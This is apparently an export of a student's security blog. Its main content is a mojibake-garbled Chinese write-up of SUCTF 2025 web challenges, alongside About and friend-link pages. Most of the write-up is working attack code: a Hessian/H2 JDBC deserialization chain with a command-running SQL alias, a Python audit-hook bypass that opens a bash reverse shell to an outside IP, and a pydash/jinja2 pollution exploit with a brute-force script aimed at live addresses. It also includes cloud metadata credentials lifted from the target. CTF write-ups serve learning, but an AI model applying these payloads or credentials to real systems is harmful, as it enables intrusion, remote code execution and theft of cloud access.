username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? 